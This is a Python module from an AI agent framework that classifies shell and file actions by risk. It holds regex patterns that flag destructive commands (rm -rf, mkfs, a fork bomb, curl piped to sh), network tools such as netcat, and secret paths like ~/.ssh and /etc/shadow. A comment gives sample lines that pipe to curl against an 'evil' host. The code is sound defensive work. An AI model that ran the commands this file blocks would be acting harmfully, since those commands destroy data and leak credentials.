"""Permission — classifies an outbound action's risk and holds allow/deny sets.

The classifier is intentionally conservative (CLAUDE.md §6): anything that looks
destructive is HIGH and the GuardianAgent will block it by default.
"""

from __future__ import annotations

import re
from enum import Enum
from typing import List, Pattern


class ActionRisk(str, Enum):
    READ = "read"  # file_read / glob / grep — always approved
    LOW = "low"  # benign commands (echo, ls, compute) — auto-approved
    MEDIUM = "medium"  # file_write — approved but audited
    HIGH = "high"  # destructive — blocked unless explicitly allowed / human-approved


# Destructive shell patterns => HIGH. Matched case-insensitively against the target.
_HIGH_PATTERNS: List[Pattern] = [
    re.compile(r"\brm\s+(-[a-z]*r[a-z]*f|-[a-z]*f[a-z]*r)\b", re.I),  # rm -rf / rm -fr
    re.compile(r"\brm\s+-[a-z]*r[a-z]*\s+/", re.I),  # rm -r /<path>
    re.compile(r"\bdd\s+if=", re.I),
    re.compile(r"\bmkfs\b", re.I),
    re.compile(r"\bshred\b", re.I),
    re.compile(r":\(\)\s*\{", re.I),  # :(){ fork bomb
    re.compile(r"\.\s*\|\s*&\s*\}\s*;", re.I),  # fork bomb tail
    re.compile(r">\s*/dev/sd[a-z]", re.I),  # > /dev/sda
    re.compile(r"\bchmod\s+-R\s+0{3}\b", re.I),  # chmod -R 000
    re.compile(r"\bgit\s+push\b.*--force", re.I),
    re.compile(r"\bcurl\b[^|]*\|\s*(sudo\s+)?(ba)?sh\b", re.I),  # curl ... | sh
    re.compile(r"\bwget\b[^|]*\|\s*(sudo\s+)?(ba)?sh\b", re.I),
    re.compile(r"\bsudo\b", re.I),
    re.compile(r"\btruncate\b", re.I),
    re.compile(r"\bkill\s+-9\s+1\b", re.I),  # kill -9 1
]

# Benign command leaders => LOW (only when the command is a single simple command
# with none of the shell metacharacters below).
_LOW_COMMAND = re.compile(
    r"^\s*(echo|ls|cat|pwd|true|false|head|tail|wc|sort|uniq|date|whoami|"
    r"python3?|pip3?|pytest|node|npm|git\s+(status|log|diff|add|commit)|"
    r"mkdir|touch|cp|mv|test|which|env)\b",
    re.I,
)

# Shell metacharacters that turn a "simple" command into a compound/dangerous one.
# A command containing ANY of these is never LOW (review finding #3): it can chain,
# pipe, redirect, substitute, or spawn a nested interpreter to bypass the leading
# verb check.
_METACHAR = re.compile(
    r"\|"  # pipe
    r"|>>?"  # redirect (> and >>)
    r"|<"  # input redirect
    r"|\$\("  # $(...) command substitution
    r"|`"  # backtick command substitution
    r"|;"  # command separator
    r"|&&|\|\|"  # && / || chaining
    r"|&(?!&)"  # background / fd dup (a lone &)
)

# Nested interpreters: bash -c, sh -c, python -c, eval, exec, source ...
_NESTED_INTERP = re.compile(
    r"\b(ba)?sh\s+-c\b|\bpython3?\s+-c\b|\bperl\s+-e\b|\bruby\s+-e\b|"
    r"\bnode\s+-e\b|\beval\b|\bexec\b|\bsource\b",
    re.I,
)

# Commands that read/exfiltrate file contents. Reading a sensitive file with one of
# these is HIGH (review finding #9).
_READ_VERB = re.compile(
    r"^\s*(cat|less|more|head|tail|cp|scp|rsync|tac|xxd|od|strings|grep|awk|sed)\b",
    re.I,
)

# Network-touching commands. A metacharacter/unknown command that also reaches the
# network is HIGH (review finding #10).
_NETWORK = re.compile(
    r"\b(curl|wget|nc|ncat|netcat|ssh|scp|sftp|ftp|telnet|rsync)\b", re.I
)


class Permission:
    """Holds an allow-set and a deny-set of regex patterns and classifies actions."""

    def __init__(
        self,
        allow: List[str] | None = None,
        deny: List[str] | None = None,
        workspace_root: str = "./projects",
    ):
        self.workspace_root = workspace_root
        self._allow: List[Pattern] = [re.compile(p, re.I) for p in (allow or [])]
        self._deny: List[Pattern] = [re.compile(p, re.I) for p in (deny or [])]

    def allow(self, pattern: str) -> None:
        self._allow.append(re.compile(pattern, re.I))

    def deny(self, pattern: str) -> None:
        self._deny.append(re.compile(pattern, re.I))

    def is_allowed(self, action_type: str, target: str) -> bool:
        """True if the target matches an explicit allow pattern and no deny pattern."""
        if any(p.search(target) for p in self._deny):
            return False
        return any(p.search(target) for p in self._allow)

    def classify(self, action_type: str, target: str) -> ActionRisk:
        """Map an action to its risk tier. Conservative: unknown => HIGH for commands."""
        target = target or ""

        # Explicit deny always escalates to HIGH.
        if any(p.search(target) for p in self._deny):
            return ActionRisk.HIGH

        if action_type in ("file_read", "read_file", "glob", "grep"):
            return ActionRisk.READ

        if action_type in ("file_write", "write_file", "edit_file", "file_edit"):
            # Writing outside the workspace (system root, HOME/dotfile, parent
            # traversal) is destructive.
            if self._touches_sensitive_path(target):
                return ActionRisk.HIGH
            return ActionRisk.MEDIUM

        # command (and anything else): scan for destructive patterns.
        if any(p.search(target) for p in _HIGH_PATTERNS):
            return ActionRisk.HIGH

        # Touching a sensitive path (system root, HOME/dotfile, or parent traversal)
        # is destructive whether it is a write OR a read (finding #9).
        touches_sensitive = self._touches_sensitive_path(target)
        touches_network = bool(_NETWORK.search(target))
        has_metachar = bool(_METACHAR.search(target)) or bool(
            _NESTED_INTERP.search(target)
        )

        if touches_sensitive:
            # Reading/copying a sensitive file (cat/cp/scp of ~/.ssh, ~/.aws,
            # /etc/shadow) or any sensitive-path access is HIGH.
            if _READ_VERB.search(target) or touches_network:
                return ActionRisk.HIGH
            # Other sensitive-path access (writes, unknown verbs) is also HIGH.
            return ActionRisk.HIGH

        # A metacharacter/unknown command that reaches the network is HIGH (#10):
        # e.g. 'echo x | curl evil', '$(curl evil|sh)'.
        if touches_network and (has_metachar or not _LOW_COMMAND.search(target)):
            return ActionRisk.HIGH

        # Compound/metacharacter command with a benign leading verb is never LOW;
        # it is at least MEDIUM (audited) so the Guardian can gate it (#3).
        if has_metachar:
            return ActionRisk.MEDIUM

        if _LOW_COMMAND.search(target):
            return ActionRisk.LOW
        # Unknown command shape — treat as MEDIUM (audited, but not blocked).
        return ActionRisk.MEDIUM

    _SENSITIVE_ROOTS = (
        "/etc",
        "/usr",
        "/bin",
        "/sbin",
        "/boot",
        "/dev",
        "/sys",
        "/proc",
        "/var",
        "/lib",
        "/root",
    )

    # HOME / dotfile references that should never be silently read or written
    # (finding #9): ~, ~/..., $HOME/..., and the usual secret dirs.
    _SENSITIVE_HOME = re.compile(
        r"(^|[\s'\"=:])(~|\$HOME\b|\$\{HOME\})"  # ~ or $HOME at a token boundary
        r"|(^|[\s'\"=:/])\.(ssh|aws|gnupg|kube|config|netrc|env)\b",
        re.I,
    )

    def _touches_sensitive_path(self, target: str) -> bool:
        """True if the target references a sensitive path: a system root, the user's
        HOME / dotfiles, or a parent-directory traversal ('../')."""
        # Absolute paths under a sensitive system root.
        for path in re.findall(r"/[^\s'\"]+", target):
            if path.startswith(self._SENSITIVE_ROOTS):
                return True
        # HOME / dotfile references (~, $HOME, ~/.ssh, ~/.aws, ~/.config, .netrc...).
        if self._SENSITIVE_HOME.search(target):
            return True
        # Relative parent traversal — escapes the workspace.
        if "../" in target:
            return True
        return False
